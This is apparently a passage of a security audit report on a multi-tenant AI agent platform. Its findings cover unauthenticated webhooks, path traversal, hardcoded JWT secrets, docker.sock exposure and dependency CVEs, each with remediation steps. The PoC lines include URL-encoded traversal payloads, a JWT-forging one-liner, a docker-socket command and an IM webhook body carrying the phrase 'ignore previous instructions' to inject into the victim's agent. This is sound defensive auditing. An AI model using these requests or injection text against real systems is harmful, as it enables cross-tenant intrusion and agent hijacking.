assumptions: Assumes an ElastiCache-disabled or fallback-to-local-Redis deployment (documented fallback behavior of user-data.sh) reachable on port 6379, and/or a deployment provisioned through the CI path where merge-env.sh does not run or runs before JWT_SECRET is checked. Redis network exposure and CI pipeline invocation are unverified (local-only assessment).
counterevidence: Three real mitigations were found: deploy.sh:239 and merge-env.sh:9 both generate a random JWT_SECRET, so deployments using those paths have a strong secret (though only when AUTH_MODE is not Cognito in deploy.sh); local Redis is disabled when ElastiCache is configured, so Redis exposure requires the documented fallback; and user-data.sh:241 places a CHANGE_ME JWT placeholder that deploy.sh's "existing values win" merge does not overwrite — but CHANGE_ME is not a secret, and neither control exists on the CI gen-base-env.py path. No source sets REDIS_PASSWORD anywhere; the empty value in both provisioning paths is a genuine gap, not an oversight of the reviewer.
confidence_rationale: All code paths verified statically, but no live deployment or CI pipeline was available to confirm the ElastiCache configuration or whether merge-env.sh always runs in practice; the JWT fallback impact depends on the backend default-secret finding filed separately.
severity_change_conditions: Proof that a real deployment runs with local Redis exposed (or ElastiCache left without auth) would confirm the Redis impact; proof that merge-env.sh never runs in the actual CI pipeline would confirm JWT forgery impact; evidence that ElastiCache is always configured with in-transit encryption and auth would reduce the Redis side to low.

title: CVE-2023-30533 in xlsx 0.18.5 (prototype pollution parsing agent-generated spreadsheets)
description: The frontend pins `xlsx` (SheetJS) 0.18.5 in `frontend/package.json`, which is affected by CVE-2023-30533 (prototype pollution via crafted worksheet, fixed in 0.19.3). The library parses attacker-supplied spreadsheet files in the chat file preview.
impact: A crafted .xlsx opened in the chat workspace viewer pollutes `Object.prototype` in the victim's browser tab. The same tab holds the auth token in localStorage, so a pollution-driven gadget in the SPA could be leveraged toward script execution and token theft; at minimum it corrupts application state and can crash the tab.
remediation_steps: Upgrade SheetJS to a fixed release (0.19.3 or later via the SheetJS CDN, as the npm `xlsx` package is frozen at 0.18.5), or switch to the maintained `xlsx` distribution source; alternatively replace with another spreadsheet parser. Additionally, validate that any future use of sheet_to_json does not switch to object output (`header` omitted) on untrusted files.
evidence:
**Advisory evidence:** `CVE-2023-30533` applies to `xlsx` at installed version `0.18.5`. The advisory is fixed in `0.19.3`.

**Dependency chain:** `xlsx@0.18.5`

**Usage analysis:** the package is loaded, but this advisory's vulnerable code does not run here. Import site: `frontend/src/pages/Chat.tsx:179` (`const XLSX = await import('xlsx')`). Call sites: `XLSX.read(arrayBuffer, { type: 'array' })` (Chat.tsx:181) and `XLSX.utils.sheet_to_json<string[]>(workbook.Sheets[name]!, { header: 1 })` (Chat.tsx:184). The advisory's pollution vector requires sheet keys like `__proto__`/`constructor.prototype` to be merged into a target object (object output of sheet_to_json / prototype-key handling); this code path uses `{header: 1}` producing arrays of arrays, and cells are rendered as `String(cell)` inside React text nodes (Chat.tsx:349), so no prototype-key merge or raw HTML sink is reached. Chain: chat file preview entry point -> Chat.tsx:179 import -> Chat.tsx:184 array-mode conversion -> escaped React rendering.
assumptions: Static code-trace only; no dynamic reproduction performed (local-only assessment, no running app with a crafted workbook). Advisory data taken from the local trivy vulnerability DB; production bundle may differ if the dependency has since been upgraded.

The advisory's pollution vector requires sheet keys like `__proto__`/`constructor.prototype` to be merged into a target object (object output of sheet_to_json / prototype-key handling); this code path uses `{header: 1}` producing arrays of arrays, and cells are rendered as `String(cell)` inside React text nodes (Chat.tsx:349), so no prototype-key merge or raw HTML sink is reached. Chain: chat file preview entry point -> Chat.tsx:179 import -> Chat.tsx:184 array-mode conversion -> escaped React rendering.
dependency_metadata.contextual_cvss_reasoning: Entry point is the authenticated workspace file fetch at frontend/src/pages/Chat.tsx:159 (GET /api/chat/sessions/{id}/workspace/file/raw), whose response bytes reach XLSX.read at frontend/src/pages/Chat.tsx:181 via the dynamic import at Chat.tsx:179. The file content is agent-generated output, not a trusted asset, so the source is attacker-influenceable (a compromised or prompt-injected agent produces the crafted .xlsx) — prerequisites L, user_interaction R, complexity H (requires the agent to emit the malicious file and the victim to open it). Impact in this context is prototype pollution of the victim's browser tab (integrity L, availability L); the same tab holds the auth token in localStorage (Chat.tsx:159), so scope crosses into the browser-origin authority (C). Code execution requires a downstream gadget, so C/I are not H.

title: Unauthenticated webhook trigger endpoint allows arbitrary tenant workflow execution (no auth, no HMAC, no replay/rate limit)
description: The webhook trigger endpoint POST /v1/webhook/:webhookId/trigger requires no authentication, no signature, and has no replay or rate protection. Anyone who obtains a webhook_id can invoke the victim organization's workflow arbitrarily many times, consuming LLM/agent execution resources and driving unauthorized state changes.
impact: Unauthenticated invocation of tenant workflows/agents on demand: attacker-controlled variables flow into agent execution (prompt-injection surface), resource consumption/cost abuse (each trigger runs the workflow, e.g. Claude/Bedrock calls), and record flooding of the victim org's webhook call history. Integrity impact is unauthorized execution of business logic as the tenant; no direct confidentiality impact was demonstrated.
technical_analysis: `webhooks.routes.ts:311` registers `POST /v1/webhook/:webhookId/trigger` as a "Public Trigger Route (no authentication required)" with no preHandler. The handler calls `webhookService.triggerWebhook` (webhook.service.ts:135). The service loads the config by webhook_id only (`prisma.webhooks.findFirst({ where: { webhook_id, deleted_at: null } })`), checks only the optional IP allowlist (`config.allowedIps`, empty by default) and enabled flag, records the call, and fire-and-forget executes the workflow (`executeWebhookAsync`) with attacker-supplied `variables`. There is no HMAC or shared-secret verification, no timestamp/nonce replay protection, and no application-level rate limiting on the route.
poc_description: 1. Obtain a webhook_id (any tenant user can create webhooks via the authenticated API; ids are also returned in webhook management responses). 2. POST /v1/webhook/:webhookId/trigger with no Authorization header and body `{"variables": {"anything": "attacker-controlled"}}`. 3. Response is 200 with `{received: true, callRecordId}` and the workflow executes fire-and-forget with the attacker's variables. 4. Repeat indefinitely — no rate limit, no replay protection.
poc_script_code:
```
# Unit PoC: cd super-agent/backend && npx vitest run tests/unit/webhook-trigger-authz.poc.test.ts
# Real trigger route, no Authorization header:
POST /v1/webhook/<victim-webhook-id>/trigger
{"variables":{"cmd":"attacker input"}}
-> 200 {"received":true,"callRecordId":"..."}   # workflow queued for execution
```
remediation_steps: Require an authentication/authorization check on the trigger route, or implement a per-webhook secret verified as an HMAC signature over the raw body with a timestamp window (as the IM adapters already do for Slack/Telegram/Discord), plus replay protection and a per-webhook/per-IP rate limit. Log and alert on triggers from unlisted sources.
evidence: Local unit PoC `backend/tests/unit/webhook-trigger-authz.poc.test.ts` boots the real webhook trigger route with mocked persistence: an unauthenticated POST (no Authorization header) returns 200 `{received: true, callRecordId}` and the webhook's async execution is dispatched with attacker-supplied variables. Source review confirms no auth/signature/rate guard on the path.
assumptions: Network access to the API host and knowledge of any active webhook_id (UUIDs, obtainable via the authenticated API or from the target tenant's own usage). Production exposure and whether rate-limiting exists in front of the service were not verified — no application-level rate limit exists in the reviewed code.
counterevidence: Checked for compensating controls: (1) the route has no preHandler, no schema-level security, and no HMAC/signature check anywhere in the trigger path; (2) `triggerWebhook` only enforces the optional IP allowlist and an enabled flag — when `allowedIps` is empty (default) any source passes; (3) no replay protection, nonce, timestamp window, or rate limiter exists on the route or in the service; (4) webhook_id values are unguessable UUIDs, which is the only practical barrier and is enumeration-resistant but irrelevant once any id leaks. The IP allowlist is a genuine control but is per-webhook, optional, and empty by default.
confidence_rationale: Complete source trace of the unauthenticated route and the service path, plus a local unit PoC against the real route handler confirming an unauthenticated trigger executes the victim webhook. Only production network exposure is unverified (out of scope).
severity_change_conditions: Evidence of an edge/gateway-level auth or rate-limiting layer in front of this route would lower severity; a demonstrated path from trigger variables to sensitive data exfiltration would raise confidentiality impact.

title: PoC app-hosting stack: docker.sock mounts, insecure Traefik dashboard, and hardcoded tenant JWT secrets
description: The app-hosting PoC stack ships with the Docker socket mounted into two containers, the Traefik dashboard exposed insecurely on all interfaces, and per-tenant JWT signing secrets hardcoded as predictable strings in source and Kubernetes manifests. While the directory is labelled a proof-of-concept, these patterns grant host-level code execution and cross-tenant token forgery on any host where the stack is run.
impact: On a host running this stack: any attacker who can reach port 8081 gets the unauthenticated Traefik dashboard (full routing/service configuration disclosure, ability to observe and manipulate proxies). The docker.sock mounts mean a compromise or SSRF/RCE inside the traefik or app-host-api containers (both reachable from the network) escalates to full host compromise — arbitrary container execution, secret and volume access. The hardcoded, predictable per-tenant JWT secrets allow forging valid tenant tokens (runtime/src/auth.ts falls back to 'poc-secret-change-me' when the env var is unset, so any deployment that relies on the fallback is forgeable).
technical_analysis:
Four independently exploitable patterns in the PoC stack, each verified at its cited line:

1. `/var/run/docker.sock` is bind-mounted into both the `traefik` service and the `app-host-api` service (docker-compose.floci.yml). Both services publish ports to the host (8080/8081 and 3001 respectively), so both are network-reachable processes holding the Docker control socket. Any code execution or SSRF-class issue inside either container — including via the app-host-api's tenant provisioning endpoints — converts directly into arbitrary container execution on the host and access to every other tenant's containers, volumes, and environment secrets.

2. Traefik runs with `--api.insecure=true` and the dashboard entrypoint is published as `"8081:8080"`, so the dashboard and its read/write HTTP API are reachable without authentication on all interfaces of the host.

3. `services/app-host-api/src/insforge.ts` lines 54, 64, 74 hardcode per-tenant `jwtSecret` values ('alpha-jwt-secret-poc-change-me', 'beta-jwt-secret-poc-change-me', 'gamma-jwt-secret-poc-change-me'). These secrets sign tenant tokens used by the app-host API; anyone who knows the repo can forge tokens for any tenant.

4. `services/runtime/src/auth.ts:4` falls back to `process.env.JWT_SECRET || 'poc-secret-change-me'`, and `k8s/tenants/*.yaml` ship literal JWT_SECRET values ('alpha-schedule-jwt-secret', 'beta-crm-jwt-secret', 'gamma-dash-jwt-secret') as plain manifest env entries, so deployments either run with a predictable public secret or rely on a fallback that is itself public.
poc_description:
1. Verify docker-compose.floci.yml mounts /var/run/docker.sock into both the traefik and app-host-api services and runs Traefik with --api.insecure=true, publishing the dashboard on host port 8081.
2. Verify app-host-api/src/insforge.ts:54/64/74 hardcodes tenant JWT secrets ('alpha-jwt-secret-poc-change-me' etc.) and runtime/src/auth.ts:4 falls back to 'poc-secret-change-me'.
3. On any host running the stack: `curl http://<host>:8081/api/http/routers` returns the unauthenticated dashboard API; inside either container, `docker -H unix:///var/run/docker.sock run ...` executes arbitrary containers on the host; with a known tenant secret, forge a JWT for any tenant/app identity.
4. None of these steps were executed against a live host (local-only assessment); each control path is verified from source.
poc_script_code:
```bash
# Static verification (executed against local checkout):
#   grep -n 'api.insecure=true' app-hosting/poc/docker-compose.floci.yml   # traefik command
#   grep -n 'docker.sock' app-hosting/poc/docker-compose.floci.yml          # mounted in traefik + app-host-api
#   sed -n '54p;64p;74p' app-hosting/poc/services/app-host-api/src/insforge.ts
#     # jwtSecret: 'alpha-jwt-secret-poc-change-me' (and beta-/gamma-)
#   sed -n '4p' app-hosting/poc/services/runtime/src/auth.ts
#     # const JWT_SECRET = process.env.JWT_SECRET || 'poc-secret-change-me'
#   grep -n 'JWT_SECRET' app-hosting/poc/k8s/tenants/*.yaml
#     # literal values: alpha-schedule-jwt-secret / beta-crm-jwt-secret / gamma-dash-jwt-secret
# Live exploitation (NOT executed; requires a host running the PoC):
#   curl http://<host>:8081/api/http/routers          # unauthenticated traefik dashboard
#   # forge: node -e 'require("jsonwebtoken").sign({sub:1,appId:"x",orgId:"y",role:"admin"},"poc-secret-change-me")'
```
remediation_steps: Do not mount docker.sock into containers that accept network traffic; use a socket proxy with restricted operations, or a container-runtime API with least privilege. Disable --api.insecure (or bind the dashboard to 127.0.0.1 behind auth). Replace every hardcoded tenant JWT secret with per-deployment generated secrets sourced from a secret store; remove the runtime fallback default and fail fast when JWT_SECRET is unset. In the k8s manifests, move JWT_SECRET values into Secrets (the schedule-app already uses a secretRef — extend that pattern to all apps).
evidence:
app-hosting/poc/docker-compose.floci.yml — traefik service:
```
    command:
      - "--api.insecure=true"
      - "--providers.docker=true"
      ...
    ports:
      - "8080:80"
      - "8081:8080"     # Traefik dashboard
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
```
app-host-api service: `volumes: - /var/run/docker.sock:/var/run/docker.sock`.
app-hosting/poc/services/app-host-api/src/insforge.ts:54/64/74: `jwtSecret: 'alpha-jwt-secret-poc-change-me'` (also beta-/gamma- variants).
app-hosting/poc/services/runtime/src/auth.ts:4: `const JWT_SECRET = process.env.JWT_SECRET || 'poc-secret-change-me'`.
app-hosting/poc/k8s/tenants/*.yaml: literal JWT_SECRET values e.g. `"gamma-dash-jwt-secret"`, `"beta-crm-jwt-secret"`, `"alpha-schedule-jwt-secret"`.
assumptions: Assumes a host running this PoC compose file or applying the k8s/tenants manifests, with the published ports (8081 dashboard, 3001 API, per-tenant DB ports) reachable to the attacker. The directory is labelled POC; no evidence was found of it being deployed beyond local demonstration, and the docker.sock paths require control of that host. Production exploitability is therefore a deployment-context question, not a demonstrated fact.
counterevidence: The whole tree sits under app-hosting/poc/ with README/ARCHITECTURE framing it as a demonstration; docker-compose uses providers.docker.exposedbydefault=false (only labelled routes exposed); the tenant-alpha schedule app pulls JWT_SECRET from a secretRef rather than a manifest literal, showing awareness of secret management; and docker.sock mounts plus the insecure dashboard are common (if risky) patterns in local docker-compose labs. However none of these are enforcement controls: the traefik dashboard is still reachable on 0.0.0.0:8081, the JWT secrets are still literal defaults, and the API container still gets full host-level docker control.
confidence_rationale: All cited lines verified statically; no running instance was available to confirm exposure, and the PoC labelling plus k8s secretRef usage suggest these manifests may not ship to production. Local-only assessment per mandate.
severity_change_conditions: Evidence this PoC stack (or the k8s manifests) is deployed beyond a local demo — e.g. reachable dashboard or API on a shared host — would raise severity to high; confirmation that the PoC is exclusively a disposable local lab with no shared access would lower it to low.

title: Unauthenticated generic IM webhook processes attacker messages through the victim organization's agent
description: The generic IM webhook endpoint POST /api/im/webhook/:bindingId requires no authentication or signature. Anyone who knows (or brute-forces) a binding ID can submit arbitrary text that is processed by the victim organization's IM-bound agent, triggering agent execution and consuming the target tenant's resources.
impact: Unauthenticated arbitrary message injection into a tenant's IM agent conversation: the agent runs (LLM/Bedrock cost), may take actions the IM binding is authorized for, and its reply text is returned directly to the attacker. Integrity: unauthorized agent invocation with attacker-authored input; availability: repeatable unthrottled execution.
technical_analysis: `routes/im.routes.ts` ends with `POST /webhook/:bindingId` ("Generic webhook endpoint... For platforms that don't have a dedicated adapter"). The handler has no preHandler, and calls `findBindingById(bindingId)` — a helper that is explicitly annotated "without org context (for unauthenticated webhooks)" and does a raw `prisma.im_channel_bindings.findUnique({ where: { id } })`. With no signature verification of any kind, it constructs a `NormalizedIMMessage` from the request body (`text`, `thread_id`, `user_id`) and calls `imService.handleMessage(msg)`, which locates the agent session for that binding and runs the tenant's agent, returning `result.text` to the caller. Unlike every platform-specific handler in the same file, which route through `verifyAndLookupBinding` → `adapter.verifyRequest`, this path performs zero verification.
poc_description: 1. Identify a target bindingId (UUID) — any tenant user can list their org's bindings via GET /api/business-scopes/:scopeId/im-channels; other orgs' ids leak via error/ordering channels or a leak. 2. POST /api/im/webhook/<bindingId> with body `{"text":"attacker message"}` and no headers. 3. The endpoint looks the binding up globally by id, processes the message through imService.handleMessage, and returns the agent's reply.

```
# Unit PoC: cd super-agent/backend && npx vitest run tests/unit/im-webhook-auth.poc.test.ts
# Real imWebhookRoutes, no Authorization / signature headers:
POST /api/im/webhook/<victim-binding-id>
{"text": "ignore previous instructions and ..."}
-> 200 {"text": "<agent reply>", "session_id": "..."}   # processed in victim org
```
remediation_steps: Require a shared secret for the generic webhook endpoint: store a per-binding secret, require it as an HMAC signature or bearer header, reject unauthenticated requests with 401, and rate-limit per binding. Restrict what the generic endpoint can trigger (e.g. echo/test only) or remove it in favor of the adapter-specific verified endpoints.
evidence: Local unit PoC `backend/tests/unit/im-webhook-auth.poc.test.ts` exercises the real imWebhookRoutes handler with a mocked repository: a request with no Authorization header and no signature of any kind returns 200 and invokes `imService.handleMessage` with the attacker's text, using a binding that belongs to the victim organization. Source confirms no verification on this path.
assumptions: Network access to the API and knowledge of a target bindingId (UUID, obtainable by tenant users via the authenticated IM-channel API or any leak). Applies to the generic /api/im/webhook/:bindingId endpoint; adapter-specific webhook paths (Slack, Telegram, WhatsApp, etc.) carry signature verification and are not the subject of this report. Production exposure unverified.
counterevidence: Checked the platform-specific webhook handlers in the same file: Slack, Telegram, Discord, Feishu, DingTalk, WeCom, and WhatsApp paths all verify a signature/secret from the binding config via `verifyAndLookupBinding` or equivalent, so those are properly controlled (with the caveat that Slack/Feishu/Discord answer URL-verification challenges before verification, which is intended protocol behavior). The generic endpoint has no such control — it has no `verifyRequest` call, no token, and `findBindingById` explicitly documents "without org context". No auth middleware is applied. Nothing mitigates it.
confidence_rationale: Direct source trace showing the generic webhook route performs no verification, plus a local unit PoC against the real route (im-webhook-auth.poc.test.ts) confirming unauthenticated messages are processed against a victim-org binding. Production exposure not tested.
severity_change_conditions: Evidence that binding IDs are effectively unobtainable cross-tenant and a gateway blocks unauthenticated access would lower severity; demonstrated exfiltration of tenant data through the agent's reply would raise it.

title: Unauthenticated avatar generation, presign, and retrieval endpoints (missing authenticate preHandler)
description: The avatar generation, batch generation, and avatar image-proxy endpoints in avatarRoutes.ts are registered without the authenticate preHandler, allowing unauthenticated users to trigger paid image generation and to fetch any avatar object by key through the backend's S3 proxy.
impact: Unauthenticated cost/DoS: repeated invocation of the (paid) avatar generation service when enabled, billed to the operator. Unauthenticated reads of avatar images by key (tenant/user avatars are generally low-sensitivity) and unauthenticated presigned-URL minting for arbitrary keys within the avatar service's scope, which can also leak the S3 bucket layout. No demonstrated access to non-avatar data.
technical_analysis: In routes/avatarRoutes.ts, POST /avatars/upload (line 11) and GET /avatars/presign/:key (line 167) include `{ preHandler: [authenticate] }`, but POST /avatars/generate (~line 46), POST /avatars/generate-batch (~line 101), and the catch-all `GET /avatars/*` proxy do not. The generation handler calls avatarService.generateAvatar(prompt) (an external image-generation call) gated only on the ENABLE_AVATAR_GENERATION env flag, not on any identity. The proxy handler strips leading avatars/ prefixes, re-prefixes the key, and streams avatarService.getAvatarData(key) with Cache-Control: public, max-age=86400. Fastify applies only the preHandlers a route declares, so these routes are anonymous.
poc_description: 1. Send POST /api/avatars/generate with body {"role":"x"} and no Authorization header — the request is processed and generation is attempted (when ENABLE_AVATAR_GENERATION is on). 2. Send POST /api/avatars/generate-batch with {"roles":["a","b",...]} — same. 3. Send GET /api/avatars/<key> unauthenticated — the avatar object is streamed from S3 via the proxy with a public 24h cache header. 4. Control: the same request without a token to /api/avatars/upload or /api/avatars/presign/<key> returns 401, showing those routes do enforce auth.
poc_script_code:
```
# Unit PoC: cd super-agent/backend && npx vitest run tests/unit/avatar-routes.authz.poc.test.ts
# No Authorization header on any of these -> processed / 200:
POST /api/avatars/generate          {"role":"x"}
POST /api/avatars/generate-batch    {"roles":["a","b"]}
GET  /api/avatars/presign/<key>
GET  /api/avatars/<key>
# Control: POST /api/avatars/upload without auth -> 401 (that route HAS the preHandler)
```
remediation_steps: Add `preHandler: [authenticate]` to the generate, generate-batch, presign, and retrieval routes in avatarRoutes.ts (mirroring the upload route in the same file), and add rate limiting on the generation endpoints. For presign/retrieval, restrict acceptable keys to the `avatars/` prefix and validate the key shape before signing.
evidence: Source review of routes/avatarRoutes.ts: only the upload route (line 11) and presign route (line 167) include `preHandler: [authenticate]`; the generate (~line 46), generate-batch (~line 101), and `GET /avatars/*` proxy (~line 191) registrations carry no preHandler, and the upload/presign routes in the same file demonstrate the pattern was intended. Local unit PoC backend/tests/unit/avatar-routes.authz.poc.test.ts confirms unauthenticated requests to the generation and retrieval endpoints are processed (no 401), while the authenticated control routes reject missing tokens.

The generate/generate-batch endpoints additionally require the operator to have set ENABLE_AVATAR_GENERATION=true (each generation then invokes the external image-generation service, creating per-request cost); the retrieval and presign endpoints are unconditionally open. Production exposure unverified.

The generate endpoints are gated by the ENABLE_AVATAR_GENERATION env flag (disabled by default), which reduces exposure of the cost-heavy path but is an operator setting, not a control that ships enforced. The proxy endpoint discloses only objects under the avatars/ prefix. No auth, rate limit, or per-key ACL was found on the cited routes.

Production exposure and cost per request not measured.

title: agentAccess explicit-permission lookup ignores organization scoping (cross-org permission confusion)
description: AgentAccessService.checkAccess() resolves explicit agent permissions by the (agent_id, user_id) pair without verifying that the agent belongs to the caller's organization. A user who holds (or obtains) a permission row for another organization's agent is granted that access level there, bypassing the org-scoped checks that guard the rest of the function.
impact: Cross-organization privilege confusion on agent access: the affected callers include agent invocation (chat.routes.ts:223), agent visibility within business scopes (businessScopes.routes.ts:678), and the agentAccess middleware (middleware/agentAccess.ts:55) — an attacker granted a permission row on a foreign-org agent gains invoke/admin access to that agent, i.e. cross-tenant use of (and potentially data exposure via) the target org's agent.
technical_analysis: `services/agentAccess.service.ts:47-77`: `checkAccess(userId, orgId, agentId, minLevel)` first queries `prisma.agent_permissions.findUnique({ where: { unique_agent_user_permission: { agent_id: agentId, user_id: userId } } })` (lines ~56-60) and, if the permission level meets the minimum, returns true immediately — with no comparison of the agent's owning organization to the caller's `orgId`. Only the fallback paths (creator check, scope membership) consult org-scoped data: the agent is re-fetched with `where: { id: agentId, organization_id: orgId }` (line 65), which is correct but unreachable once the explicit-permission branch has returned. Any agent_permissions row that pairs a user with another organization's agent therefore grants that user access across the tenant boundary.
poc_description: 1. As user U of organization A, obtain an agent_permissions row for agent X of organization B (any flow that writes agent_permissions keyed by user id — e.g. cross-org sharing or imported data). 2. Call an endpoint protected by agentAccess middleware or chat invocation that calls checkAccess(U, orgA, X, 'invoke'). 3. The explicit-permission lookup (agentAccess.service.ts:56-60) matches on (agent_id, user_id) only and returns true before any organization check. 4. The request proceeds against organization B's agent.
poc_script_code:
```
# Unit PoC: cd super-agent/backend && npx vitest run tests/unit/tenant-isolation.audit.test.ts
# Real agentAccessService.checkAccess with mocked prisma:
agent_permissions.findUnique({ where: { unique_agent_user_permission:
  { agent_id: 'agentX', user_id: 'user-orgA' } } })
  -> { permission: 'admin' }        # row referencing another org's agent
checkAccess('user-orgA', 'orgA', 'agentX', 'admin') === true
# The org-scoped prisma.agents.findFirst is never consulted (short-circuit).
```
remediation_steps: In AgentAccessService.checkAccess, validate the resolved explicit permission against the agent's organization before trusting it: either join the permission lookup to agents and require `agent.organization_id === orgId`, or perform the existing org-scoped agent lookup (line 65) first and skip/ignore explicit permissions when the agent is not in the caller's organization. Apply the same fix to any sibling functions in agentAccess.service.ts that read agent_permissions without org context.
evidence: Local unit PoC `backend/tests/unit/tenant-isolation.audit.test.ts` ("agentAccess cross-org permission confusion"): mocks `agent_permissions.findUnique` to return `{permission:'admin', agent_id:'agentX', user_id:'user-orgA'}` and calls the real `agentAccessService.checkAccess('user-orgA','orgA','agentX','admin')` — returns true even though agentX belongs to another org; the org-scoped agent lookup is never reached because the explicit-permission branch returns first.
assumptions: An attacker with an authenticated session in organization A whose user_id appears in an `agent_permissions` record for an agent belonging to organization B (e.g. via cross-org sharing, a data import, an admin mistakenly granting permission to a user id, or the shared-UUID collision scenario the tenant-isolation audit demonstrates). Production exploitability depends on whether cross-org permission rows can realistically arise; the code permits them and trusts them unconditionally. Validated locally against the real service with mocked prisma.
counterevidence: The subsequent checks in checkAccess DO scope by organization: the agent lookup at line 65 filters `{ id: agentId, organization_id: orgId }` and returns false when the agent is not in the caller's org, and scope-membership inheritance is likewise scope-bound. So the vulnerability is confined to the explicit `agent_permissions` branch, which runs FIRST and short-circuits with `return true` before the org-scoped checks. A unique composite index `unique_agent_user_permission` enforces one row per (agent,user) pair but does not constrain the pair to a single organization. If agent_permissions rows can only ever be created through an org-validated flow, real-world exploitability narrows; no such constraint exists at this layer.
confidence_rationale: Complete source trace: the explicit-permission lookup at agentAccess.service.ts:56-60 queries only by (agent_id, user_id) with no organization_id, and returns true before any org-scoped query runs. Local unit PoC (tenant-isolation.audit.test.ts) confirms the behavior against the real service. The only unproven element is how often cross-org permission rows exist in real data — stated in assumptions.
severity_change_conditions: Evidence that cross-org agent_permissions rows occur in practice (e.g. via a sharing feature that writes them) would raise severity to high with lower attack complexity; evidence that every writer of agent_permissions enforces same-org pairs would lower this to a hardening finding.

title: Path traversal in pack-deploy onboarding/deploy via unvalidated packId and scopeDirName
description: The pack onboarding and deploy endpoints pass the raw packId and scopeDirName path parameters into Node path.join() with no validation or containment check, so URL-encoded traversal sequences let an authenticated user read JSON files outside the industry-packs directory tree.
impact: Authenticated arbitrary-file read (JSON files only, via the onboarding reader) relative to the process working directory: can disclose configuration files, deployment metadata, or other packs' content present on the server filesystem as JSON. Limited to files that parse as JSON on this path; no write or execute primitive demonstrated.
technical_analysis: `routes/pack-deploy.routes.ts:38` (`GET /onboarding/:packId/:scopeDirName`) and the POST /deploy handler (line ~38-80) pass the raw params to `packDeployService`. In `services/pack-deploy.service.ts`, `getOnboardingConfig` (line 118) builds `packDir = join(baseDir, 'industry-pack-' + packId)` and `scopeDir = join(packDir, 'scopes', scopeDirName)` / `twinDir = join(packDir, 'digital-twins', scopeDirName)` (lines 120-126) with no sanitization, then `readFile(join(resolvedDir, 'onboarding.json'))` (line 131). Node's `join` does not neutralize `../` segments, and Fastify URL-decodes path params, so a URL-encoded `..%2f` (or literal ../) in scopeDirName or packId walks out of the industry-packs tree. The deploy path (`deployScope`, lines 226-235) uses the same unvalidated joins when reading scope.json/twin.json/manifest/workflow files.
poc_description: 1. Authenticate with any account. 2. Send GET /api/packs/onboarding/customer-service/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc-adjacent-target — the router decodes %2e%2e%2f into ../, and path.join resolves outside the pack directory. 3. If the resolved directory contains onboarding.json, its content is returned to the caller. 4. The deploy endpoint POST /api/packs/deploy with the same traversal in scopeDirName reaches the analogous joins in deployScope (:226-235).
poc_script_code:
```
# Unit PoC: cd super-agent/backend && npx vitest run tests/unit/pack-deploy-traversal.poc.test.ts
# Marker onboarding.json OUTSIDE the packs tree is returned via traversal:
GET /api/packs/onboarding/<packId>/%2e%2e%2f%2e%2e%2fleaked-scope
-> 200 { data: { secret: "TRAVERSAL-MARKER-9f31ab" } }
# (Fastify decodes %2e%2e%2f -> ../, join(baseDir, 'industry-pack-<packId>',
#  'scopes', '../../../leaked-scope') escapes the subtree)
```
remediation_steps: Validate packId and scopeDirName against a strict format (e.g. ^[a-z0-9-]+$) before any filesystem use, and after constructing each path, verify containment by resolving it and checking that the resolved path remains inside the packs base directory (resolve() + startsWith(baseDir) with a trailing separator), rejecting otherwise. Apply the check in both getOnboardingConfig and deployScope in pack-deploy.service.ts.
evidence: Local unit PoC `backend/tests/unit/pack-deploy-traversal.poc.test.ts`: a marker `onboarding.json` containing `TRAVERSAL-MARKER-9f31ab` is written to a temp directory outside the packs root; the packs base dir is pointed there; GET /api/packs/onboarding/<packId>/%2e%2e%2f%2e%2e%2fleaked-scope returns the marker content, proving the traversal escapes the industry-packs/scopes subtree.
assumptions: Authenticated user with access to the pack routes (any role). Exploit requires readability of a target file as `onboarding.json` (or, for the deploy variant, valid pack structure) outside the industry-packs tree. Production exposure and industry-packs directory contents unverified.
counterevidence: Checked for guards: (1) the route validates only that packId and scopeDirName are present strings (pack-deploy.routes.ts:64-70) — no character or format validation; (2) the service performs no path normalization, prefix check, or containment assertion before existsSync/readFile; (3) no authorization check ties the operation to a pack catalog. The Fastify router URL-decodes path params, which is what makes URL-encoded ../ effective and is a fact to state, not a control. Fastify's default 404 behavior does not restrict param characters. No control found. Mitigating: the read is constrained to a JSON parse — non-JSON files throw and return null, so disclosure is limited to parseable onboarding.json content (or, on the deploy path, whatever JSON/YAML the deploy routine reads).
confidence_rationale: Complete source trace: unvalidated path params flow into join() with no normalization or containment check at any of the cited lines, and the local unit PoC (pack-deploy-traversal.poc.test.ts) reads a marker onboarding.json placed in a temp directory outside the packs root via URL-encoded traversal in scopeDirName. Live-server behavior not tested.
severity_change_conditions: Demonstrated disclosure of a secret-bearing JSON file on the server (e.g. a config with credentials) would raise severity; confirmation that the industry-packs root and all readable JSON are non-sensitive would lower it to low.

title: CVE-2026-48779 in ws 8.19.0 (WebSocket small-fragment memory exhaustion DoS of the chat gateway)

The backend's chat execution WebSocket gateway runs on this version.
impact: An unauthenticated network peer that can open a WebSocket connection to the backend can, with modest traffic, drive the Node process into out-of-memory termination — taking down the API/chat-execution service for all tenants.
remediation_steps: In backend/package.json, force the resolution of `ws` to >= 8.21.0 (npm `overrides: { "ws": "^8.21.0" }`) or bump `@fastify/websocket` to a release depending on a fixed ws. **Advisory evidence:** `CVE-2026-48779` applies to `ws` at installed version `8.19.0`. The advisory is fixed in `8.21.0`.

**Transitive dependency:** introduced by the direct dependency `@fastify/websocket@11.2.0`.

**Dependency chain:** `@fastify/websocket@11.2.0 > ws@8.19.0`

title: axios 1.13.6 in backend (multiple 2026 SSRF/proxy-bypass CVEs, not reachable as used)
description: The backend pins `axios` 1.13.6 in `backend/package-lock.json`, pulled transitively by the direct IM-adapter SDKs (`@larksuiteoapi/node-sdk` 1.60.0, `@wecom/aibot-node-sdk` 1.0.7, `dingtalk-stream` 2.1.6-beta.1). axios before 1.15.1 is affected by a family of 2026 SSRF/proxy-handling CVEs (e.g. CVE-2026-42043, the 127.0.0.0/8 NO_PROXY bypass that NVD scores 10.0, and CVE-2026-42264, CRLF/header splitting, 9.1).
